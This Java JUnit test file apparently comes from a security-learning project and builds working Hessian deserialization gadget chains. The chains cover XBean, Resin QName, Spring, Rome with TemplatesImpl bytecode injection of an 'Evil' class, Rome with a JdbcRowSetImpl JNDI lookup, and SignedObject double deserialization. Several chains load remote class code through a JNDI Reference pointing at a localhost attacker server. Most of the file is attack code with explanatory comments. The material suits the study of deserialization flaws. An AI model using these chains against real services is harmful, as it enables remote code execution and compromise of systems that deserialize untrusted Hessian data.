package com.endlessshw.serialization.test;

import com.caucho.hessian.client.HessianProxyFactory;
import com.caucho.naming.QName;
import com.endlessshw.serialization.service.Greeting;
import com.endlessshw.serialization.util.Evil;
import com.endlessshw.serialization.util.TestClass;
import com.fasterxml.jackson.databind.util.ClassUtil;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import org.junit.jupiter.api.Test;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS8Key;

import javax.naming.CannotProceedException;
import javax.naming.Context;
import javax.naming.Reference;
import javax.sql.rowset.JdbcRowSet;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.security.*;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.Hashtable;

import static com.endlessshw.serialization.util.SerializeUtil.*;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2024/10/3 15:50
 */
public class HessianTest {

    @Test
    public void testXBean_HashCrash() throws Exception {
        // 1. 从底向上写 PoC，先完成 ContextUtil$ReadOnlyBinding 的实例化
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        Context ctx = createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding readOnlyBinding = new ContextUtil.ReadOnlyBinding("EndlessShw", reference, ctx);

        // 3. 创建 HashMap，需要其 equals()
        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        // HashMap 中的 Node 应该就是数据结构链表中的节点
        Constructor<?> nodeDeclaredConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeDeclaredConstructor.setAccessible(true);
        // 第一个参数是 Node 的 hash，保证不和 XString.hashCode 相同就行。最后一个填 null 就行
        Object nodeReadOnlyBinding = nodeDeclaredConstructor.newInstance(0, readOnlyBinding, "EndlessShw", null);
        // 这里保证反序列化时 Hash 相同
        XString xString = new XString(unhash(readOnlyBinding.hashCode()));
        Object nodeXString = nodeDeclaredConstructor.newInstance(1, xString, "EndlessShw", null);
        // 创建 Node[] table，但是 Node 是 protected，因此需要反射
        Object nodeArray = Array.newInstance(nodeClass, 2);
        Array.set(nodeArray, 0, nodeReadOnlyBinding);
        Array.set(nodeArray, 1, nodeXString);

        // 4. 通过反射将元素插入 HashMap，这样可以保证序列化时不会触发
        HashMap<Object, Object> map = new HashMap<>();
        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        tableField.set(map, nodeArray);
        Field sizeField = map.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(map, 2);

        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }

    @Test
    public void testXBean() throws Exception{
        // 1. 从底向上写 PoC，先完成 ContextUtil$ReadOnlyBinding 的实例化
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        Context ctx = createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding readOnlyBinding = new ContextUtil.ReadOnlyBinding("foo", reference, ctx);
        XString xString = new XString("EndlessShw");
        // 2. 创建两个 HotSwappableTargetSource 以包裹 XString 和 readOnlyBinding
        HotSwappableTargetSource hstsXString = new HotSwappableTargetSource(xString);
        HotSwappableTargetSource hstsReadOnlyBinding = new HotSwappableTargetSource(readOnlyBinding);

        // 3. 创建 HashMap，需要其 equals()
        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        // HashMap 中的 Node 应该就是数据结构链表中的节点
        Constructor<?> nodeDeclaredConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeDeclaredConstructor.setAccessible(true);
        // 第一个参数是 Node 的 hash，保证不和 XString.hashCode 相同就行。最后一个填 null 就行
        Object nodeReadOnlyBinding = nodeDeclaredConstructor.newInstance(0, hstsReadOnlyBinding, "EndlessShw", null);
        Object nodeXString = nodeDeclaredConstructor.newInstance(1, hstsXString, "EndlessShw", null);
        // 创建 Node[] table，但是 Node 是 protected，因此需要反射
        Object nodeArray = Array.newInstance(nodeClass, 2);
        Array.set(nodeArray, 0, nodeReadOnlyBinding);
        Array.set(nodeArray, 1, nodeXString);

        // 4. 通过反射将元素插入 HashMap，这样可以保证序列化时不会触发
        HashMap<Object, Object> map = new HashMap<>();
        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        tableField.set(map, nodeArray);
        Field sizeField = map.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(map, 2);

        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }

    @Test
    public void testResin_Spring() throws Exception{
        // 1. 从底向上写 PoC，先完成 ContinuationContext 的实例化，它为 protected 类型，没法 new 出来
        Class<?> continuationContextClass = Class.forName("javax.naming.spi.ContinuationContext");
        Constructor<?> continuationContextDeclaredConstructor = continuationContextClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        continuationContextDeclaredConstructor.setAccessible(true);
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        // VersionHelper.loadClass() 中所需要的 Reference 最终来自 cpe.getResolvedObj()
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(reference);
        Object continuationContext = continuationContextDeclaredConstructor.newInstance(cpe, new Hashtable<>());

        // 2. 实例化 QName，修改其 _context 为 ContinuationContext
        QName qName = new QName((Context) continuationContext, "EndlessShw", "EndlessShw");
        XString xString = new XString("EndlessShw");
        // 创建两个 HotSwappableTargetSource 以包裹 XString 和 QName
        HotSwappableTargetSource hstsXString = new HotSwappableTargetSource(xString);
        HotSwappableTargetSource hstsQName = new HotSwappableTargetSource(qName);

        // 3. 创建 HashMap，需要其 equals()
        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        // HashMap 中的 Node 应该就是数据结构链表中的节点
        Constructor<?> nodeDeclaredConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeDeclaredConstructor.setAccessible(true);
        // 第一个参数是 Node 的 hash，保证不和 XString.hashCode 相同就行。最后一个填 null 就行
        Object nodeReadOnlyBinding = nodeDeclaredConstructor.newInstance(0, hstsQName, "EndlessShw", null);
        Object nodeXString = nodeDeclaredConstructor.newInstance(1, hstsXString, "EndlessShw", null);
        // 创建 Node[] table，但是 Node 是 protected，因此需要反射
        Object nodeArray = Array.newInstance(nodeClass, 2);
        Array.set(nodeArray, 0, nodeReadOnlyBinding);
        Array.set(nodeArray, 1, nodeXString);

        // 4. 通过反射将元素插入 HashMap，这样可以保证序列化时不会触发
        HashMap<Object, Object> map = new HashMap<>();
        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        tableField.set(map, nodeArray);
        Field sizeField = map.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(map, 2);

        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }


    /**
     * 弹两次
     *
     * @throws Exception
     */
    @Test
    public void testResin_Qname3() throws Exception {
        // 1. 从底向上写 PoC，先完成 ContinuationContext 的实例化，它为 protected 类型，没法 new 出来
        Class<?> continuationContextClass = Class.forName("javax.naming.spi.ContinuationContext");
        Constructor<?> continuationContextDeclaredConstructor = continuationContextClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        continuationContextDeclaredConstructor.setAccessible(true);
        // VersionHelper.loadClass() 中所需要的 Reference 最终来自 cpe.getResolvedObj()
        CannotProceedException cpe = new CannotProceedException();
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        cpe.setResolvedObj(reference);
        Object continuationContext = continuationContextDeclaredConstructor.newInstance(cpe, new Hashtable<>());

        // 2. 实例化 QName，修改其 _context 为 ContinuationContext
        QName qName = new QName((Context) continuationContext, "EndlessShw", "EndlessShw");

        // 3. 创建 HashMap，需要其 equals()
        // 这里保证 Hash 相同
        XString xString = new XString(unhash(qName.hashCode()));

        // 4. 通过反射将元素插入 HashMap
        HashMap<Object, Object> map = new HashMap<>();
        map.put(qName, "EndlessShw");
        map.put(xString, "EndlessShw");

        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }

    /**
     * 标准写法
     *
     * @throws Exception
     */
    @Test
    public void testResin_Qname() throws Exception {
        // 1. 从底向上写 PoC，先完成 ContinuationContext 的实例化，它为 protected 类型，没法 new 出来
        Class<?> continuationContextClass = Class.forName("javax.naming.spi.ContinuationContext");
        Constructor<?> continuationContextDeclaredConstructor = continuationContextClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        continuationContextDeclaredConstructor.setAccessible(true);
        // VersionHelper.loadClass() 中所需要的 Reference 最终来自 cpe.getResolvedObj()
        CannotProceedException cpe = new CannotProceedException();
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        cpe.setResolvedObj(reference);
        Object continuationContext = continuationContextDeclaredConstructor.newInstance(cpe, new Hashtable<>());

        // 2. 实例化 QName，修改其 _context 为 ContinuationContext
        QName qName = new QName((Context) continuationContext, "EndlessShw", "EndlessShw");

        // 3. 创建 HashMap，需要其 equals()
        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        // HashMap 中的 Node 应该就是数据结构链表中的节点
        Constructor<?> nodeDeclaredConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeDeclaredConstructor.setAccessible(true);
        // 第一个参数是 Node 的 hash，保证不和 XString.hashCode 相同就行。最后一个填 null 就行
        Object nodeQName = nodeDeclaredConstructor.newInstance(0, qName, "EndlessShw", null);
        // 这里保证反序列化时 Hash 相同
        XString xString = new XString(unhash(qName.hashCode()));
        Object nodeXString = nodeDeclaredConstructor.newInstance(1, xString, "EndlessShw", null);
        // 创建 Node[] table，但是 Node 是 protected，因此需要反射
        Object nodeArray = Array.newInstance(nodeClass, 2);
        Array.set(nodeArray, 0, nodeQName);
        Array.set(nodeArray, 1, nodeXString);

        // 4. 通过反射将元素插入 HashMap，这样可以保证序列化时不会触发
        HashMap<Object, Object> map = new HashMap<>();
        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        tableField.set(map, nodeArray);
        Field sizeField = map.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(map, 2);

        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }


    /**
     * 自己尝试了 Hash 碰撞，但是没有弹
     *
     * @throws Exception
     */
    @Test
    public void testResin_Qname2() throws Exception {
        // 1. 从底向上写 PoC，先完成 ContinuationContext 的实例化，它为 protected 类型，没法 new 出来
        Class<?> continuationContextClass = Class.forName("javax.naming.spi.ContinuationContext");
        Constructor<?> continuationContextDeclaredConstructor = continuationContextClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        continuationContextDeclaredConstructor.setAccessible(true);
        // VersionHelper.loadClass() 中所需要的 Reference 最终来自 cpe.getResolvedObj()
        CannotProceedException cpe = new CannotProceedException();
        Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:8888/");
        cpe.setResolvedObj(reference);
        Object continuationContext = continuationContextDeclaredConstructor.newInstance(cpe, new Hashtable<>());

        // 2. 实例化 QName，修改其 _context 为 ContinuationContext
        QName qName = new QName((Context) continuationContext, "EndlessShw", "EndlessShw");

        // 3. 创建 HashMap，需要其 equals()
        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        // HashMap 中的 Node 应该就是数据结构单链表中的节点
        Constructor<?> nodeDeclaredConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeDeclaredConstructor.setAccessible(true);
        // 最后一个填 null 就行，说明链表到头了
        Object nodeQName = nodeDeclaredConstructor.newInstance(0, qName, "EndlessShw", null);
        XString xString = new XString("");
        Field mObjField = xString.getClass().getSuperclass().getDeclaredField("m_obj");
        mObjField.setAccessible(true);
        String s = Integer.toHexString(qName.hashCode());
        Field hashField = s.getClass().getDeclaredField("hash");
        hashField.setAccessible(true);
        hashField.set(s, qName.hashCode());
        mObjField.set(xString, s);
        Object nodeXString = nodeDeclaredConstructor.newInstance(1, xString, "EndlessShw", null);
        // 创建 Node[] table，但是 Node 是 protected，因此需要反射
        Object nodeArray = Array.newInstance(nodeClass, 2);
        Array.set(nodeArray, 0, nodeQName);
        Array.set(nodeArray, 1, nodeXString);


        // 4. 通过反射修改 HashMap，使得两个节点的 Hash 值相同
        HashMap<Object, Object> map = new HashMap<>();
        // todo 不能直接改 table，table 是 HashMap 的底层容器，改了的话，其存储的键值对也改了。不能直接这么改。
        // HashMap 底层原理是链表，那么想要触发 equals 应该要让两个 Node 的 hash 相同
        Field tableField = map.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        tableField.set(map, nodeArray);
        Field sizeField = map.getClass().getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(map, 2);


        byte[] bytes = hessianSerialize(map);
        hessianUnSerToObj(bytes);
    }

    @Test
    public void testRome_doubleSer() throws Exception {
        // 1. 直接拉 Rome 链
        KeyPairGenerator kpGen = KeyPairGenerator.getInstance("RSA");
        kpGen.initialize(1024);
        KeyPair kp = kpGen.generateKeyPair();
        PrivateKey sk = kp.getPrivate();
        Signature s = Signature.getInstance("SHA1withRSA");
        SignedObject signedObject = new SignedObject((Serializable) getRomeObj(), sk, s);

        // 2. 构造 chain，先让链断开
        ObjectBean objectBean = new ObjectBean(String.class, "EndlessShw");
        // 注意这里是 JdbcRowSetImpl.class，JdbcRowSet 接口中没有定义：
        /**{@link com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()}**/
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, new ToStringBean(SignedObject.class, signedObject));

        // 3. 构造 kick-off HashMap
        HashMap<Object, String> objectBeanStringHashMap = new HashMap<>();
        objectBeanStringHashMap.put(objectBean, "EndlessShw");

        // 4. 动态修改 ObjectBean 中的 EqualsBean
        Field equalsBeanField = objectBean.getClass().getDeclaredField("equalsBean");
        equalsBeanField.setAccessible(true);
        equalsBeanField.set(objectBean, equalsBean);

        byte[] bytes = hessianSerialize(objectBeanStringHashMap);
        hessianUnSerToObj(bytes);
    }


    @Test
    public void testRome_JNDI() throws Exception {
        // 1. 构造 sink
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("rmi://127.0.0.1:1099/myRemote");

        // 2. 构造 chain，先让链断开
        ObjectBean objectBean = new ObjectBean(String.class, "EndlessShw");
        // 注意这里是 JdbcRowSetImpl.class，JdbcRowSet 接口中没有定义：
        /**{@link com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()}**/
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet));

        // 3. 构造 kick-off HashMap
        HashMap<Object, String> objectBeanStringHashMap = new HashMap<>();
        objectBeanStringHashMap.put(objectBean, "EndlessShw");

        // 4. 动态修改 ObjectBean 中的 EqualsBean
        Field equalsBeanField = objectBean.getClass().getDeclaredField("equalsBean");
        equalsBeanField.setAccessible(true);
        equalsBeanField.set(objectBean, equalsBean);

        byte[] bytes = hessianSerialize(objectBeanStringHashMap);
        hessianUnSerToObj(bytes);
    }

    @Test
    public void testHessian() throws MalformedURLException {
        String url = "http://localhost:8080/hello";
        HessianProxyFactory hessianProxyFactory = new HessianProxyFactory();
        Greeting greeting = (Greeting) hessianProxyFactory.create(Greeting.class, url);

        System.out.println("Hessian Call:" + greeting.sayHello("admin"));
    }

    @Test
    public void testHessianSer() throws IOException {
        // Evil evil = new Evil();
        byte[] bytes = hessianSerialize(new TestClass());
        // ObjectBean
        int hash = 391594477;
        System.out.println((hash) ^ (hash >>> 16));
    }

    private Object getRomeObj() throws Exception {
        // 1. 读取恶意类 bytes[] 并 sink 构造
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.endlessshw.serialization.util.Evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        // 要求 1 - 注入恶意字节码
        Field bytecodesField = templates.getClass().getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{bytes});
        // 要求 2 - 保证 _name 不为 null
        Field nameField = templates.getClass().getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "EndlessShw");

        // 2. 构造 chain，先让链断开
        ObjectBean objectBean = new ObjectBean(String.class, "EndlessShw");
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, new ToStringBean(Templates.class, templates));

        // 3. 构造 kick-off HashMap
        HashMap<Object, String> objectBeanStringHashMap = new HashMap<>();
        objectBeanStringHashMap.put(objectBean, "EndlessShw");

        // 4. 动态修改 ObjectBean 中的 EqualsBean
        Field equalsBeanField = objectBean.getClass().getDeclaredField("equalsBean");
        equalsBeanField.setAccessible(true);
        equalsBeanField.set(objectBean, equalsBean);

        return objectBeanStringHashMap;
    }

    public static String unhash(int hash) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if (target < 0) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if (target == Integer.MIN_VALUE)
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }

    private static void unhash0(StringBuilder partial, int target) {
        int div = target / 31;
        int rem = target % 31;

        if (div <= Character.MAX_VALUE) {
            if (div != 0)
                partial.append((char) div);
            partial.append((char) rem);
        } else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }


    @SuppressWarnings ( {
            "unchecked"
    } )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
}
